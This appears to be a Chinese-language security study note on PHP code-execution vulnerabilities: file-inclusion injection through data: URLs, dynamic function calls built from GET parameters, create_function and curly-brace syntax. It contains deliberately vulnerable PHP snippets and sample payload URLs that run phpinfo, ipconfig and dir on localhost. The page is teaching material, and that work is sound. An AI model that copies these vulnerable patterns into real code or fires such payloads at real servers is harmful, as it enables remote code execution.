---
layout: default
---
# ![](../img/hj.jpg)代码执行漏洞
>小贱提示： 这里只是说说方法，至于原理我也懒得说了，毕竟这是笔记嘛，笔记就是要简单方便查阅

## ![](../img/github23.png)文件包含代码注射
文件包含函数在特定条件下的代码注射，如
```
include()、
include_once()、
require()、
require_once()。
当allow_url_include=On ，PHP Version>=5.2.0 时，导致代码注射。
demo code 2.1:
<?php
include($_GET['a']);
?>
访问http://127.0.0.1/include.php?a=data:text/plain,%3C?php%20phpinfo%28%29;?%3E 即
执行phpinfo()。
```
## ![](../img/github24.png)动态执行代码
1、动态变量代码执行
```
<?php
$dyn_func = $_GET['dyn_func'];        //get接受参数作为函数名
$argument = $_GET['argument'];      //get接受参数作为参数
$dyn_func($argument);
?>

我们提交 http://127.0.0.1/dyn_func.php?dyn_func=system&argument=ipconfig 执行ipconfig命令
```
2、动态函数代码执行create_function（）
```
<?php
$foobar = $_GET['foobar'];
$dyn_func = create_function('$foobar', "echo $foobar;");
$dyn_func('');
?>

我们提交 http://127.0.0.1/create_function.php?foobar=system%28dir%29 执行dir命令
```
## ![](../img/github25.png)${ }
php的Curly Syntax也能导致代码执行，它将执行花括号间的代码，并将结果替换回去
举例1：
```
<?php
$var = "I was innocent until ${'ls'} appeared here"?>
会将ls结果返回
```
举例2：
```
<?php
$foobar = 'phpinfo';
${'foobar'}();?>
```
__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
